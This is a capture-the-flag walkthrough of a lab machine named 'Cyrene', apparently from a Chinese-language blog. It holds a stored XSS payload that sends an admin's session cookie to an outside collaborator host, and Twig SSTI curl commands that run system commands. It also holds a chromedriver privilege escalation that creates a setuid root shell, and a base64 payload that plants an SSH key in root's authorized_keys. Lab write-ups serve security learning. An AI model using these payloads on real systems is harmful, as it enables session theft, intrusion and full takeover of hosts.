---
title: "Cyrene"
date: "2026-09-22"
lastmod: 2026-09-22T02:05:37.304Z
slug: "cyrene"
summary: "cry"
tags:
  - "maze"
  - "shell"
  - "linux"
categories: []
draft: false
cover: ""
---

# Cyrene

# nmap

```bash

┌──(lily2663㉿LAPTOP-L8P806AH)-[~]
└─$ nmap -sS -p- -A 192.168.31.51
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-21 17:46 +0800
Nmap scan report for Cyrene (192.168.31.51)
Host is up (0.00077s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.3 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.68 ((Unix))
|_http-title: Customer Feedback - Fuukei Support Portal
|_http-server-header: Apache/2.4.68 (Unix)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=9/21%OT=22%CT=1%CU=39674%PV=Y%DS=2%DC=T%G=Y%TM=6AB0FD2
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=22)SE
OS:Q(SP=102%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=21)SEQ(SP=102%GCD=1%ISR=10E%TI=
OS:Z%CI=Z%II=I%TS=21)SEQ(SP=103%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=22)SEQ(SP=1
OS:06%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=21)OPS(O1=M5B4ST11NW9%O2=M5B4ST11NW9%
OS:O3=M5B4NNT11NW9%O4=M5B4ST11NW9%O5=M5B4ST11NW9%O6=M5B4ST11)WIN(W1=FE88%W2
OS:=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNS
OS:NW9%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
OS:RIPCK=G%RUCK=589F%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK
OS:=G%RUCK=58B9%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RU
OS:CK=58D3%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=58
OS:DF%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=58F9%RU
OS:D=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

TRACEROUTE (using port 1720/tcp)
HOP RTT     ADDRESS
1   0.12 ms LAPTOP-L8P806AH.mshome.net (172.22.64.1)
2   0.68 ms Cyrene (192.168.31.51)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.67 seconds
```

# dirsaerch

```bash

┌──(lily2663㉿LAPTOP-L8P806AH)-[~]
└─$ dirsearch -u http://192.168.31.51/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/lily2663/reports/http_192.168.31.51/__26-09-21_17-47-00.txt

Target: http://192.168.31.51/

[17:47:00] Starting:
[17:47:01] 403 -  316B  - /.ht_wsr.txt
[17:47:01] 403 -  316B  - /.htaccess.bak1
[17:47:01] 403 -  316B  - /.htaccess.orig
[17:47:01] 403 -  316B  - /.htaccess_extra
[17:47:01] 403 -  316B  - /.htaccess.save
[17:47:01] 403 -  316B  - /.htaccess.sample
[17:47:01] 403 -  316B  - /.htaccess_orig
[17:47:01] 403 -  316B  - /.htaccess_sc
[17:47:01] 403 -  316B  - /.htaccessBAK
[17:47:01] 403 -  316B  - /.htaccessOLD2
[17:47:01] 403 -  316B  - /.htaccessOLD
[17:47:01] 403 -  316B  - /.html
[17:47:01] 403 -  316B  - /.htm
[17:47:01] 403 -  316B  - /.htpasswd_test
[17:47:01] 403 -  316B  - /.htpasswds
[17:47:01] 403 -  316B  - /.httr-oauth
[17:47:04] 302 -    0B  - /admin.php  ->  login.php
[17:47:08] 200 -  820B  - /cgi-bin/printenv
[17:47:08] 200 -    1KB - /cgi-bin/test-cgi
[17:47:08] 200 -  254B  - /composer.json
[17:47:08] 200 -   11KB - /composer.lock
[17:47:08] 200 -    0B  - /config.php
[17:47:09] 301 -  351B  - /data  ->  http://192.168.31.51/data/
[17:47:09] 200 -  319B  - /data/
[17:47:10] 200 -  154B  - /footer.php
[17:47:11] 500 -    0B  - /header.php
[17:47:13] 200 -    1KB - /login.php
[17:47:13] 302 -    0B  - /logout.php  ->  index.php
[17:47:18] 403 -  316B  - /server-status/
[17:47:18] 403 -  316B  - /server-status
[17:47:21] 200 -    0B  - /vendor/composer/autoload_files.php
[17:47:21] 200 -    0B  - /vendor/composer/autoload_namespaces.php
[17:47:21] 200 -    0B  - /vendor/composer/autoload_static.php
[17:47:21] 200 -    0B  - /vendor/composer/autoload_real.php
[17:47:21] 200 -    1KB - /vendor/composer/LICENSE
[17:47:21] 200 -  495B  - /vendor/
[17:47:21] 200 -   11KB - /vendor/composer/installed.json
[17:47:21] 200 -    0B  - /vendor/composer/autoload_psr4.php
[17:47:21] 200 -    0B  - /vendor/composer/ClassLoader.php
[17:47:21] 200 -    0B  - /vendor/composer/autoload_classmap.php
[17:47:21] 200 -    0B  - /vendor/autoload.php

Task Completed
```

# XSS+Twig SSTI

![1789983143714](/assets/img/typora/1789983143714.png)

储存型XSS

```http
301as4xd77y0dt6wvgxo7r26wx2oqee3.oastify.com
```

bp轮询，PHPSESSID 设了 HttpOnly，借会话

```js
<script>x=new XMLHttpRequest;x.open("GET","/admin_server_info.php",0);x.send();new Image().src="http://301as4xd77y0dt6wvgxo7r26wx2oqee3.oastify.com/ck?"+x.responseText.match(/PHPSESSID=[a-z0-9]+/)</script>
```

拿到cookie

```http
GET /ck?PHPSESSID=1ejr1sij5ns3kl2qi2ub9h5tq4 HTTP/1.1
Host: 301as4xd77y0dt6wvgxo7r26wx2oqee3.oastify.com
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/151.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://127.0.0.1/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

```

![1789986566527](/assets/img/typora/1789986566527.png)

Templates，猜测SSTI



![1789989701178](/assets/img/typora/1789989701178.png)



重定向麻了

http://192.168.31.51/composer.lock

Twig SSTI

![1789992818520](/assets/img/typora/1789992818520.png)

构造curl

```bash
curl -H "Cookie: PHPSESSID=1ejr1sij5ns3kl2qi2ub9h5tq4" -X POST http://192.168.31.51/admin_email.php \
  --data-urlencode "name=rce" \
  --data-urlencode 'body={{["id"]|filter("system")}}' \
  --data-urlencode "action=preview"
```

 

```bash
curl -H "Cookie: PHPSESSID=1ejr1sij5ns3kl2qi2ub9h5tq4" -X POST http://192.168.31.51/admin_email.php \
  --data-urlencode "name=rce" \
  --data-urlencode 'body={{["cat /etc/passwd"]|filter("system")}}' \
  --data-urlencode "action=preview"
```

```bash
 root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
klogd:x:100:101:klogd:/dev/null:/sbin/nologin
apache:x:101:102:apache:/var/www:/sbin/nologin
pi:x:1000:1000::/home/pi:/bin/bash
```



```bash
curl -H "Cookie: PHPSESSID=1ejr1sij5ns3kl2qi2ub9h5tq4" -X POST http://192.168.31.51/admin_email.php \
  --data-urlencode "name=rce" \
  --data-urlencode 'body={{["cat /home/pi/user.txt"]|filter("system")}}' \
  --data-urlencode "action=preview"
```

![1789990102754](/assets/img/typora/1789990102754.png)

# UserFlag

```
flag{user-6352e71c1a99ab360615924160c47e57}
```

# chromedriver提权

```
curl -H "Cookie: PHPSESSID=1ejr1sij5ns3kl2qi2ub9h5tq4" -X POST http://192.168.31.51/admin_email.php \
  --data-urlencode "name=rce" \
  --data-urlencode 'body={{["ps aux"]|filter("system")}}' \
  --data-urlencode "action=preview"
```

```bash
     PID   USER     TIME  COMMAND
    1 root      0:00 /sbin/init
    2 root      0:00 [kthreadd]
    3 root      0:00 [pool_workqueue_]
    4 root      0:00 [kworker/R-rcu_g]
    5 root      0:00 [kworker/R-sync_]
    6 root      0:00 [kworker/R-kvfre]
    7 root      0:00 [kworker/R-slub_]
    8 root      0:00 [kworker/R-netns]
   10 root      0:00 [kworker/0:0H-kb]
   12 root      0:00 [kworker/u8:0-ev]
   13 root      0:00 [kworker/R-mm_pe]
   14 root      0:00 [kworker/u8:1-ip]
   15 root      0:00 [ksoftirqd/0]
   16 root      0:01 [rcu_preempt]
   17 root      0:00 [rcu_exp_par_gp_]
   18 root      0:00 [rcu_exp_gp_kthr]
   19 root      0:00 [migration/0]
   20 root      0:00 [kprobe-optimize]
   21 root      0:00 [idle_inject/0]
   22 root      0:00 [cpuhp/0]
   23 root      0:00 [cpuhp/1]
   24 root      0:00 [idle_inject/1]
   25 root      0:00 [migration/1]
   26 root      0:06 [ksoftirqd/1]
   28 root      0:00 [kworker/1:0H-kb]
   31 root      0:00 [kdevtmpfs]
   32 root      0:00 [kworker/R-inet_]
   33 root      0:00 [rcu_tasks_kthre]
   34 root      0:00 [rcu_tasks_rude_]
   35 root      0:00 [kauditd]
   36 root      0:00 [oom_reaper]
   38 root      0:00 [kworker/R-write]
   39 root      0:00 [kworker/u9:2-ev]
   40 root      0:00 [kcompactd0]
   41 root      0:00 [ksmd]
   42 root      0:00 [khugepaged]
   43 root      0:00 [kworker/R-kbloc]
   44 root      0:00 [kworker/R-blkcg]
   45 root      0:00 [kworker/R-kinte]
   46 root      0:00 [irq/9-acpi]
   47 root      0:00 [kworker/1:1-eve]
   48 root      0:00 [kworker/R-md_bi]
   49 root      0:00 [kworker/R-edac-]
   50 root      0:00 [kworker/R-devfr]
   51 root      0:00 [watchdogd]
   52 root      0:00 [kworker/R-quota]
   54 root      0:00 [kswapd0]
   74 root      0:00 [kworker/R-kthro]
  100 root      0:00 [kworker/u9:3-ev]
  198 root      0:00 [kworker/R-mld]
  212 root      0:00 [kworker/R-ipv6_]
  213 root      0:00 [kworker/R-kstrp]
  273 root      0:00 [kworker/u10:4-e]
  478 root      0:00 [kworker/u11:0]
  479 root      0:00 [kworker/u12:0]
  480 root      0:00 [kworker/u13:0]
  856 root      0:00 [kworker/u10:5-e]
  864 root      0:00 [kworker/R-ata_s]
  870 root      0:00 [scsi_eh_0]
  874 root      0:00 [kworker/R-scsi_]
  910 root      0:00 [kworker/R-mpt_p]
  911 root      0:00 [kworker/R-mpt/0]
  912 root      0:00 [scsi_eh_1]
  913 root      0:00 [kworker/R-scsi_]
  950 root      0:00 [kworker/0:1H-kb]
 1323 root      0:00 [kworker/1:2H-kb]
 1327 root      0:00 [jbd2/sda3-8]
 1328 root      0:00 [kworker/R-ext4-]
 1869 root      0:00 [kworker/1:2-eve]
 1931 root      0:00 [kworker/R-ttm]
 2124 root      0:00 [jbd2/sda1-8]
 2125 root      0:00 [kworker/R-ext4-]
 2318 root      0:00 /sbin/udhcpc -b -R -p /var/run/udhcpc.eth0.pid -i eth0 -x hostname:Cyrene
 2381 root      0:00 /sbin/syslogd -t -n
 2405 root      0:00 python3 /opt/admin_bot/bot.py
 2419 root      0:03 chromedriver --port=9515 --log-path=/var/log/admin_bot_driver.log
 2420 root      0:01 {Daemon} /opt/cobbler-venv/bin/python3 /opt/cobbler-venv/bin/cobblerd -F
 2442 root      0:00 /sbin/acpid -f
 2481 root      0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
 2507 root      0:00 /usr/sbin/httpd -d /var/www -f /etc/apache2/httpd.conf -k start
 2527 root      0:00 /usr/sbin/crond -c /etc/crontabs -f
 2547 ntp       0:00 /usr/sbin/ntpd -N -p pool.ntp.org -n
 2554 root      0:00 /sbin/getty -I \033c 38400 tty1
 2555 root      0:00 /sbin/getty 38400 tty2
 2559 root      0:00 /sbin/getty 38400 tty3
 2560 root      0:00 /sbin/getty 38400 tty4
 2567 root      0:00 /sbin/getty 38400 tty5
 2570 root      0:00 /sbin/getty 38400 tty6
 2578 apache    0:00 /usr/sbin/httpd -d /var/www -f /etc/apache2/httpd.conf -k start
 2706 apache    0:00 /usr/sbin/httpd -d /var/www -f /etc/apache2/httpd.conf -k start
 2710 apache    0:00 /usr/sbin/httpd -d /var/www -f /etc/apache2/httpd.conf -k start
 2718 apache    0:00 /usr/sbin/httpd -d /var/www -f /etc/apache2/httpd.conf -k start
 2719 apache    0:00 /usr/sbin/httpd -d /var/www -f /etc/apache2/httpd.conf -k start
 2722 apache    0:00 /usr/sbin/httpd -d /var/www -f /etc/apache2/httpd.conf -k start
 2726 apache    0:00 /usr/sbin/httpd -d /var/www -f /etc/apache2/httpd.conf -k start
 2728 apache    0:00 /usr/sbin/httpd -d /var/www -f /etc/apache2/httpd.conf -k start
 2733 apache    0:00 /usr/sbin/httpd -d /var/www -f /etc/apache2/httpd.conf -k start
 2734 apache    0:00 /usr/sbin/httpd -d /var/www -f /etc/apache2/httpd.conf -k start
 3868 root      0:00 [kworker/u9:0-ev]
 4963 root      0:01 [kworker/0:0-eve]
10443 root      0:03 [kworker/0:2-eve]
13308 root      0:00 [kworker/u10:0]
14058 apache    0:00 ps aux
```

发现：

```bash
 2405 root      0:00 python3 /opt/admin_bot/bot.py
 2419 root      0:03 chromedriver --port=9515 --log-path=/var/log/admin_bot_driver.log
 2420 root      0:01 {Daemon} /opt/cobbler-venv/bin/python3 /opt/cobbler-venv/bin/cobblerd -F
```

排查root的本地端口

```bash
curl -H "Cookie: PHPSESSID=1ejr1sij5ns3kl2qi2ub9h5tq4" -X POST http://192.168.31.51/admin_email.php \
  --data-urlencode "name=rce" \
  --data-urlencode 'body={{["netstat -tlnp"]|filter("system")}}' \
  --data-urlencode "action=preview"
```

```bash
      Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:9515          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:25151         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:39733         0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 ::1:9515                :::*                    LISTEN      -
tcp        0      0 :::80                   :::*                    LISTEN      -
tcp        0      0 :::22                   :::*                    LISTEN      -
```



探查

```bash
curl -H "Cookie: PHPSESSID=1ejr1sij5ns3kl2qi2ub9h5tq4" -X POST http://192.168.31.51/admin_email.php \
  --data-urlencode "name=rce" \
  --data-urlencode 'body={{["curl 127.0.0.1:9515/status"]|filter("system")}}' \
  --data-urlencode "action=preview"
```

```js
      {"value":{"build":{"version":"151.0.7922.173 (a96602f30358e9b5d256a0464e7e4d4bec223004-refs/branch-heads/7922@{#3322})"},"message":"ChromeDriver ready for new sessions.","os":{"arch":"x86_64","name":"Linux","version":"7.1.3-0-stable"},"ready":true}}
```

```
tcp  127.0.0.1:9515   LISTEN      ← chromedriver
tcp  127.0.0.1:25151  LISTEN      ← cobbler
```

查询存在chromedriver提权手法

```
Selenium 的协议特性：
chromedriver启动浏览器session时，会用goog:chromeOptions.binary指定的可执行文件、
以chromedriver自己的权限拉起进程。
它本来是给测试人员指定自定义Chrome路径用的——chromedriver是 root，指定的 binary就以 root 跑。
session 建立失败无所谓（Chrome二进制校验会报错）
```

于是从这里入手，chromedriver 会以 **root** 启动 goog:chromeOptions.binary指定的任意可执行文件

```bash
B64=$(printf '%s' 'printf "#!/bin/sh\ncp /bin/bash /tmp/rb\nchmod 4755 /tmp/rb\ncat /root/root.txt > /tmp/o.txt\nchmod 644 /tmp/o.txt\n" > /tmp/x.sh; chmod +x /tmp/x.sh; curl -s -X POST http://127.0.0.1:9515/session -H "Content-Type: application/json" -d "{\"capabilities\":{\"alwaysMatch\":{\"browserName\":\"chrome\",\"goog:chromeOptions\":{\"binary\":\"/tmp/x.sh\",\"args\":[]}}}}"; sleep 2; cat /tmp/o.txt' | base64 -w0)
curl -H "Cookie: PHPSESSID=1ejr1sij5ns3kl2qi2ub9h5tq4" -X POST http://192.168.31.51/admin_email.php \
  --data-urlencode "name=t" \
  --data-urlencode "body={{['echo $B64|base64 -d|sh']|filter('system')}}" \
  --data-urlencode "action=preview"

```

![1789991880512](/assets/img/typora/1789991880512.png)

得到flag

# RootFlag

```bash
flag{root-18687f6ee5c8104d2b5190fb7b8983a9}
```



进shell

```
curl -H "Cookie: PHPSESSID=1ejr1sij5ns3kl2qi2ub9h5tq4" -X POST http://192.168.31.51/admin_email.php \
  --data-urlencode "name=t" \
  --data-urlencode "body={{['echo cHJpbnRmICIjIS9iaW4vc2hcbm1rZGlyIC1wIC9yb290Ly5zc2hcbmVjaG8gXCJzc2gtcnNhIEFBQUFCM056YUMxeWMyRUFBQUFEQVFBQkFBQUJnUURNTUZlNTc5VThXdk82YkFpbGdjUW15YTBZT1FYdXJpRjJ3cW1kaHlCUjBBK1pINk9MdzlxcnZIbnNJbjhxVTUzbkhLbmVONGxyWnRMc1oxeGJLWUdja3haaWxkdjQwdmZKMzRHOWg4TWtmT3BoTFVZL3FIbXd0QXI0d05McWJoejAyS3BDMWNFK283S0FPcWZ6SEJsTUErSVFVVTRBbFJrbUdaVUhqQnFOVGpTRExmQWZFSUJRSHhkYmxZL0NRZmJxYmZCYWl1ZTloenFEdVA1b1FodGFtdEdDSUh3ZUJtbEplcVdpVnNFR2t6TU81RUl6aHhQY1JtRVlzRjExREYxRTN2UFBBZjRpVlEyMEh5L0tLVWpPdjFSYlh4N1drRFZ0dUtydFllOWRHRldMTEV2cGtDV29nUlFXd0l6a2l2WW5ZTU1JZTAwRFI3bW9lcDhlRUJLc1NMMjByRm9ZZHhwMmVHRmJZL2ZPMi84dkE3QTlxWEVKNW1sSjVmTENhTmZVRHMwQTBDdVQ0MTZzWW9NZDVNaE1XY0tCTno3eWxCdjNsc0xkTXJpYVlxc2Z5d1ZnVHlJMFNnUzVvbTVQbUpJL21rZm5KcG1Nc2pxb1VlZXFLTzFPOTFvTVVZZnVVKzlnV25STjJUbjRIT0dqVld0STNnVUEwUmdSeWM4cjJKRT0gMjEzOTE4NjQzNmxpbHltQGdtYWlsLmNvbVwiID4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXNcbmNobW9kIDcwMCAvcm9vdC8uc3NoXG5jaG1vZCA2MDAgL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXNcbnsgaWQ7IGNhdCAvcm9vdC9yb290LnR4dDsgY2F0IC9yb290Ly5zc2gvYXV0aG9yaXplZF9rZXlzOyB9ID4gL3RtcC9vLnR4dFxuY2htb2QgNjQ0IC90bXAvby50eHRcbiIgPiAvdG1wL3guc2g7IGNobW9kICt4IC90bXAveC5zaDsgY3VybCAtcyAtWCBQT1NUIGh0dHA6Ly8xMjcuMC4wLjE6OTUxNS9zZXNzaW9uIC1IICJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24iIC1kICJ7XCJjYXBhYmlsaXRpZXNcIjp7XCJhbHdheXNNYXRjaFwiOntcImJyb3dzZXJOYW1lXCI6XCJjaHJvbWVcIixcImdvb2c6Y2hyb21lT3B0aW9uc1wiOntcImJpbmFyeVwiOlwiL3RtcC94LnNoXCIsXCJhcmdzXCI6W119fX19IiA+IC9kZXYvbnVsbDsgc2xlZXAgMjsgY2F0IC90bXAvby50eHQ=|base64 -d|sh']|filter('system')}}" \
  --data-urlencode "action=preview"

```

![1789993392567](/assets/img/typora/1789993392567.png)